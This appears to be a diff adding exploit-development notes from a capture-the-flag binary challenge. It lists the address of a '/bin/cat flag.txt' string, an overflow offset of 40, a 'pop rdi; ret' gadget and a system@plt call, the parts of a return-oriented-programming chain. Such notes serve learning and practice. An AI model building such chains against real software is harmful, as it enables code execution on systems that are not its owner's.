@@ -1,0 +1,5 @@
+0x00601060  17  18 (.data) ascii /bin/cat flag.txt
+Found at offset 40 (big-endian search) 
+0x0000000000400883: pop rdi; ret; 
+0x0000000000400810 <+9>:	call   0x4005e0 <system@plt>
+
